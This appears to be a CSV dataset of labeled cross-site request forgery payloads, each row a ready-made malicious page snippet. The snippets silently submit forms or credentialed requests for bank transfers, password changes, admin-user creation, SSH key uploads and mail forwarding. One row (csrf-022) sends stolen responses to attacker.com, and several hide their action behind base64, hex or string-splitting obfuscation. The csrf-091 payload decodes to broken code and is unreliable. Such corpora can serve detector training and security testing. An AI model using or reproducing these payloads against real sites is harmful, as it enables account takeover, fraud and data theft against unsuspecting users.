id,attack_class,type,severity,context,payload_hash,payload
csrf-008,CSRF,CSRF,high,Malicious webpage,37d767acccaa,"<iframe style='display:none' srcdoc=""<form action='https://target.com/settings' method='POST' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>""></iframe>"
csrf-009,CSRF,CSRF,high,Malicious webpage,e1c0395d88a9,<svg><script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script></svg>
csrf-010,CSRF,CSRF,medium,Malicious webpage,5c46282a1f28,"<script>navigator.sendBeacon('https://target.com/track', 'data=malicious');</script>"
csrf-011,CSRF,CSRF,high,Malicious webpage,c39f13593e27,"<form action='https://target.com/update' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>"
csrf-012,CSRF,CSRF,high,Malicious webpage,d809ad34500c,"<img src='invalid.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/like',true);xhr.withCredentials=true;xhr.send('post=123');"">"
csrf-013,CSRF,CSRF,high,Malicious webpage,c926fb983e67,<form action='https://target.com/transfer' method='POST' id='f'><input type='hidden' name='amount' value='1000'/><input type='hidden' name='to' value='attacker'/></form><script>document.getElementById('f').submit();</script>
csrf-014,CSRF,CSRF,high,Malicious webpage,5a059c60e8ab,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'value=1'});</script>"
csrf-015,CSRF,CSRF,medium,Malicious webpage,70585676a5c1,<form action='https://target.com/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>
csrf-016,CSRF,CSRF,high,Malicious webpage,8d81a79ee7e2,"<script>setTimeout(function(){fetch('https://target.com/api/delete',{method:'POST',credentials:'include'});},1000);</script>"
csrf-017,CSRF,CSRF,high,Malicious webpage,0907082dc674,<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/settings' method='POST' target='hiddenFrame' id='f'><input name='setting' value='danger'/></form><script>document.getElementById('f').submit();</script>
csrf-018,CSRF,CSRF,medium,Malicious webpage,2a6fd49b2b4c,<form action='https://target.com/add-friend' method='GET' id='f'><input name='user' value='attacker'/></form><script>document.getElementById('f').submit();</script>
csrf-019,CSRF,CSRF,high,Malicious webpage,77a2d13fed16,<form id='f' action='https://target.com/subscribe' method='POST'><input name='plan' value='premium'/></form><script>document.getElementById('f').submit();</script>
csrf-020,CSRF,CSRF,medium,Malicious webpage,4f4b2e0acba6,"<script>navigator.sendBeacon('https://target.com/api/track', 'action=subscribe');</script>"
csrf-021,CSRF,CSRF,high,Malicious webpage,ee8b0e8aa8e4,"<iframe style='display:none' id='f'></iframe><form action='https://target.com/api/transfer' method='POST' target='f' id='form'><input name='amount' value='9999'/><input name='to' value='attacker'/></form><script>setTimeout(()=>document.getElementById('form').submit(),2000);</script>"
csrf-022,CSRF,CSRF,critical,Malicious webpage,b4a3cb7aaf70,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',body:'setting=evil'}).then(r=>r.text()).then(t=>fetch('https://attacker.com/log?data='+encodeURIComponent(t)));</script>"
csrf-023,CSRF,CSRF,high,Malicious webpage,c9c5e7a165d1,<form action='https://target.com/api/settings' method='POST' id='f'><input type='hidden' name='mode' value='stealth'/><input type='hidden' name='level' value='admin'/></form><script>document.getElementById('f').submit();</script>
csrf-024,CSRF,CSRF,high,Malicious webpage,00c76245ee0e,"<img src='https://target.com/api/trigger' onload=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/confirm',true);xhr.withCredentials=true;xhr.send('confirm=yes');"">"
csrf-026,CSRF,CSRF,medium,Malicious webpage,9bff94b7b388,"<script>navigator.sendBeacon('https://target.com/api/track','action=steal');</script>"
csrf-027,CSRF,CSRF,medium,Malicious webpage,a01ffc9e0cb3,<form action='https://target.com/api/upload' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='file'/></form><script>document.getElementById('f').submit();</script>
csrf-028,CSRF,CSRF,high,Malicious webpage,9214122703a4,"<iframe style='display:none' srcdoc=""<form action='https://target.com/api/modify' method='POST' id='f'><input name='param' value='evil'/></form><script>document.getElementById('f').submit();</script>""></iframe>"
csrf-029,CSRF,CSRF,high,Malicious webpage,335278d40f21,"<script>setTimeout(()=>fetch('https://target.com/api/step1',{method:'POST',credentials:'include'}),1000);setTimeout(()=>fetch('https://target.com/api/step2',{method:'POST',credentials:'include'}),3000);</script>"
csrf-030,CSRF,CSRF,high,Malicious webpage,6ce8562d3c80,<iframe name='hidden' style='display:none'></iframe><form action='https://target.com/api/settings' method='POST' target='hidden' id='f'><input name='mode' value='stealth'/></form><script>document.getElementById('f').submit();</script>
csrf-031,CSRF,CSRF,high,Malicious webpage,b5a582fcf8c7,"<script>fetch('https://target.com/api/update',{method:'POST',credentials:'include',headers:{'X-CSRF-Token':'fake'},body:'data=evil'});</script>"
csrf-032,CSRF,CSRF,high,Malicious webpage,997d0b34072f,"<form action='https://target.com/api/submit' method='POST' onsubmit='this.data.value=""hacked""'><input name='data' value='original'/></form><script>document.forms[0].submit();</script>"
csrf-033,CSRF,CSRF,high,Malicious webpage,d61f67a45e2f,"<img src='invalid.jpg' onerror=""fetch('https://target.com/api/like',{method:'POST',credentials:'include',body:'post=123'});"">"
csrf-034,CSRF,CSRF,medium,Malicious webpage,e0494faa21fc,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=premium'/>
csrf-035,CSRF,CSRF,critical,Malicious webpage,14d73f0357ea,<script>var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();</script>
csrf-036,CSRF,CSRF,high,Malicious webpage,c55f504baf02,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete'})});</script>"
csrf-037,CSRF,CSRF,high,Malicious webpage,cfade78088eb,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2000);</script>"
csrf-040,CSRF,CSRF,high,Malicious webpage,880402431d89,"<iframe name='hiddenFrame' style='display:none'></iframe><form action='https://target.com/api/hidden' method='POST' target='hiddenFrame' id='f'><input name='secret' value='data'/></form><script>setTimeout(()=>document.getElementById('f').submit(),1500);</script>"
csrf-041,CSRF,CSRF,high,Malicious webpage,389530314746,"<script>var img=new Image();img.onload=function(){fetch('https://target.com/api/action',{method:'POST',credentials:'include'});};img.src='https://target.com/api/trigger';</script>"
csrf-042,CSRF,CSRF,high,Malicious webpage,753a6750fadb,"<form action='https://target.com/api/first' method='POST' id='f1'><input type='hidden' name='step' value='1'/></form><form action='https://target.com/api/second' method='POST' id='f2'><input type='hidden' name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),2500);</script>"
csrf-043,CSRF,CSRF,high,Malicious webpage,d0636898a0ee,"<script>fetch('https://target.com/api/custom',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json','X-Requested-With':'XMLHttpRequest'},body:JSON.stringify({cmd:'run'})});</script>"
csrf-044,CSRF,CSRF,high,Malicious webpage,a636b05c44d9,"<form action='https://target.com/api/modify' method='POST' onsubmit='this.token.value=""hacked""'><input type='hidden' name='token' value='original'/></form><script>document.forms[0].submit();</script>"
csrf-045,CSRF,CSRF,high,Malicious webpage,41d369f85603,"<img src='nonexistent.jpg' onerror=""var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/api/like',true);xhr.withCredentials=true;xhr.send('post=999');"">"
csrf-046,CSRF,CSRF,medium,Malicious webpage,913ec9f7ae65,<meta http-equiv='refresh' content='0;url=https://target.com/api/subscribe?plan=vip'/>
csrf-047,CSRF,CSRF,critical,Malicious webpage,33715066d4ef,"<script>setTimeout(()=>{var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},2000);</script>"
csrf-048,CSRF,CSRF,high,Malicious webpage,fae315d0aba7,"<script>fetch('https://target.com/api/json',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({delete:true})});</script>"
csrf-049,CSRF,CSRF,high,Malicious webpage,d7e1e872555c,"<form action='https://target.com/api/step1' method='POST' id='f1'><input name='step' value='1'/></form><form action='https://target.com/api/step2' method='POST' id='f2'><input name='step' value='2'/></form><script>document.getElementById('f1').submit();setTimeout(()=>document.getElementById('f2').submit(),3000);</script>"
csrf-051,CSRF,CSRF,critical,Admin panel user management,24e33a8cbec8,<form action='https://example.com/admin/add-user' method='POST' id='f'><input name='username' value='eviladmin'/><input name='role' value='admin'/></form><script>document.getElementById('f').submit();</script>
csrf-052,CSRF,CSRF,medium,Email service user settings,5e8bb3bd17f2,<form action='https://mail.example.com/settings/notifications' method='POST' id='f'><input name='email_alerts' value='off'/></form><script>document.getElementById('f').submit();</script>
csrf-053,CSRF,CSRF,high,Security 2FA reset endpoint,d7bf8bc728e4,<img src='https://secure.example.com/2fa/reset?user=target' style='display:none'/>
csrf-054,CSRF,CSRF,medium,Streaming service subscription,3d473f4b81e9,<meta http-equiv='refresh' content='0;url=https://streaming.example.com/subscribe?plan=premium'/>
csrf-055,CSRF,CSRF,high,E-commerce user profile,48a38c494092,<form action='https://shop.example.com/account/address' method='POST' id='f'><input name='address' value='123 Evil St'/></form><script>document.getElementById('f').submit();</script>
csrf-056,CSRF,CSRF,medium,Social media friend management,f8de91adaea8,<form action='https://social.example.com/friends/add' method='POST' id='f'><input name='friend_id' value='attacker'/></form><script>document.getElementById('f').submit();</script>
csrf-057,CSRF,CSRF,medium,Blog comment submission,09ac356afad2,<form action='https://blog.example.com/comments' method='POST' id='f'><input name='post_id' value='123'/><textarea name='comment'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>
csrf-058,CSRF,CSRF,medium,Social media profile update,c9c57b4c6ac1,<form action='https://social.example.com/profile/picture' method='POST' enctype='multipart/form-data' id='f'><input type='file' name='avatar' value='evil.jpg'/></form><script>document.getElementById('f').submit();</script>
csrf-059,CSRF,CSRF,critical,Online banking transfer,7fb3269d1b64,<form action='https://bank.example.com/transfer' method='POST' id='f'><input name='amount' value='10000'/><input name='to_account' value='attacker'/></form><script>document.getElementById('f').submit();</script>
csrf-060,CSRF,CSRF,high,Security settings,7fcebf2c054e,<form action='https://security.example.com/settings' method='POST' id='f'><input name='alerts' value='off'/></form><script>document.getElementById('f').submit();</script>
csrf-061,CSRF,CSRF,critical,User account management,42d2cba81036,<form action='https://example.com/account/change-password' method='POST' id='f'><input name='new_password' value='P@ssw0rdHacked'/></form><script>document.getElementById('f').submit();</script>
csrf-062,CSRF,CSRF,high,Continuous Integration webhook settings,ac1aacacc692,<form action='https://ci.example.com/settings/webhooks' method='POST' id='f'><input name='url' value='https://attacker.com/hook'/></form><script>document.getElementById('f').submit();</script>
csrf-063,CSRF,CSRF,low,Calendar application settings,d961a6063aa5,<form action='https://calendar.example.com/settings' method='POST' id='f'><input name='timezone' value='UTC+14'/></form><script>document.getElementById('f').submit();</script>
csrf-064,CSRF,CSRF,high,Email forwarding settings,9c83e9132a9b,<form action='https://mail.example.com/settings/forwarding' method='POST' id='f'><input name='forward_to' value='attacker@example.com'/></form><script>document.getElementById('f').submit();</script>
csrf-065,CSRF,CSRF,critical,Git hosting service SSH keys,210847a6d78c,<form action='https://git.example.com/account/keys' method='POST' id='f'><textarea name='key'>ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA...</textarea></form><script>document.getElementById('f').submit();</script>
csrf-066,CSRF,CSRF,low,User interface settings,0d0053c88491,<form action='https://example.com/settings/language' method='POST' id='f'><input name='lang' value='xx-XX'/></form><script>document.getElementById('f').submit();</script>
csrf-067,CSRF,CSRF,low,Newsletter subscription,622b7ed2fbf6,<form action='https://newsletter.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>
csrf-068,CSRF,CSRF,medium,Social media posting,af831f51f416,<form action='https://twitter.com/i/tweet/create' method='POST' id='f'><textarea name='tweet'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>
csrf-069,CSRF,CSRF,medium,SMS spam management,e70a2f816d0a,<form action='https://sms.example.com/spam/add' method='POST' id='f'><input name='phone' value='+1234567890'/></form><script>document.getElementById('f').submit();</script>
csrf-070,CSRF,CSRF,high,Payment gateway account settings,53279ca8b153,<form action='https://payments.example.com/account/payment-method' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>
csrf-071,CSRF,CSRF,high,Code review platform settings,695518e54afb,<form action='https://code.example.com/reviews/settings' method='POST' id='f'><input name='auto_approve' value='true'/></form><script>document.getElementById('f').submit();</script>
csrf-072,CSRF,CSRF,high,IoT device management,06539b961bf2,<form action='https://iot.example.com/devices/add' method='POST' id='f'><input name='device_id' value='attacker_device'/></form><script>document.getElementById('f').submit();</script>
csrf-073,CSRF,CSRF,medium,Calendar event management,22a191983dac,<form action='https://calendar.example.com/events/edit' method='POST' id='f'><input name='event_id' value='123'/><input name='title' value='Hacked Event'/></form><script>document.getElementById('f').submit();</script>
csrf-074,CSRF,CSRF,high,Firewall management,56b511b6a176,<form action='https://firewall.example.com/blacklist/add' method='POST' id='f'><input name='ip' value='victim_ip'/></form><script>document.getElementById('f').submit();</script>
csrf-075,CSRF,CSRF,high,DNS management,5811fb3b968c,<form action='https://dns.example.com/settings' method='POST' id='f'><input name='dns_server' value='8.8.8.8'/></form><script>document.getElementById('f').submit();</script>
csrf-076,CSRF,CSRF,low,Mailing list subscription,35b8f5b61d11,<form action='https://mailinglist.example.com/subscribe' method='POST' id='f'><input name='email' value='victim@example.com'/></form><script>document.getElementById('f').submit();</script>
csrf-077,CSRF,CSRF,medium,Social media profile,a0b0dbe94a29,<form action='https://social.example.com/profile/bio' method='POST' id='f'><textarea name='bio'>Hacked by attacker</textarea></form><script>document.getElementById('f').submit();</script>
csrf-079,CSRF,CSRF,medium,App notification settings,95b444329130,<form action='https://app.example.com/settings/notifications' method='POST' id='f'><input name='push_notifications' value='off'/></form><script>document.getElementById('f').submit();</script>
csrf-080,CSRF,CSRF,critical,Payment gateway,ae14b43ee9c7,<form action='https://payments.example.com/account/add-card' method='POST' id='f'><input name='card_number' value='4111111111111111'/><input name='expiry' value='12/30'/></form><script>document.getElementById('f').submit();</script>
csrf-081,CSRF,CSRF,high,Dynamic base64 decoded form submission,5576c7cdf97b,<script>var b='PGZvcm0gYWN0aW9uPSdodHRwczovL3RhcmdldC5jb20vYWN0aW9uL3VwZGF0ZScgbWV0aG9kPSdQT1NUJz48aW5wdXQgbmFtZT0nZGF0YScgdmFsdWU9J2V2aWwnPjwvaW5wdXQ+PC9mb3JtPg==';var d=atob(b);var f=document.createElement('div');f.innerHTML=d;document.body.appendChild(f);f.firstChild.submit();</script>
csrf-082,CSRF,CSRF,high,Hex encoded script with eval,80150a2de6d0,<script>eval(unescape('%66%6f%72%6d%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%66%6f%72%6d%27%29%3b%66%6f%72%6d%2e%61%63%74%69%6f%6e%20%3d%20%27%68%74%74%70%73%3a%2f%2f%74%61%72%67%65%74%2e%63%6f%6d%2f%75%70%64%61%74%65%27%3b%66%6f%72%6d%2e%6d%65%74%68%6f%64%20%3d%20%27%50%4f%53%54%27%3b%76%61%72%20%69%6e%70%75%74%20%3d%20%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%69%6e%70%75%74%27%29%3b%69%6e%70%75%74%2e%6e%61%6d%65%20%3d%20%27%64%61%74%61%27%3b%69%6e%70%75%74%2e%76%61%6c%75%65%20%3d%20%27%65%76%69%6c%27%3b%66%6f%72%6d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%69%6e%70%75%74%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%66%6f%72%6d%29%3b%66%6f%72%6d%2e%73%75%62%6d%69%74%28%29%3b'));</script>
csrf-083,CSRF,CSRF,high,Dynamic iframe with form,34ddd7e00481,"<script>var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/transfer"" method=""POST"" id=""f""><input name=""amount"" value=""1000""/></form><script>document.getElementById(\'f\').submit();</script>');d.close();</script>"
csrf-084,CSRF,CSRF,high,String concatenation obfuscation,33bbe2e9954f,<script>var a='ht';var b='tps://';var c='target';var d='.com';var e='/api/evil';var f=document.createElement('form');f.action=a+b+c+d+e;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
csrf-085,CSRF,CSRF,medium,User interaction triggered CSRF,c4dc5dd6942d,"<form action='https://target.com/api/settings' method='POST' id='f'><input name='mode' value='stealth'/></form><div onmouseover='document.getElementById(""f"").submit()'>Hover me</div>"
csrf-086,CSRF,CSRF,high,Delayed form submission,8b45f6a6aee6,"<script>setTimeout(function(){var f=document.createElement('form');f.action='https://target.com/api/delete';f.method='POST';document.body.appendChild(f);f.submit();},3000);</script>"
csrf-087,CSRF,CSRF,high,Encoded element creation,198e83555479,<script>var p=decodeURIComponent('%66%6f%72%6d');var f=document.createElement(p);f.action='https://target.com/api/update';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
csrf-088,CSRF,CSRF,critical,Stealth iframe with postMessage,378008f1a10b,"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>"
csrf-089,CSRF,CSRF,high,String split and join obfuscation,c4273e4ae4ca,<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>
csrf-090,CSRF,CSRF,critical,Script injection via innerHTML,800c03a6a9c6,"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();</script>';</script>"
csrf-091,CSRF,CSRF,critical,Base64 encoded eval obfuscation,59ae757aff38,<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>
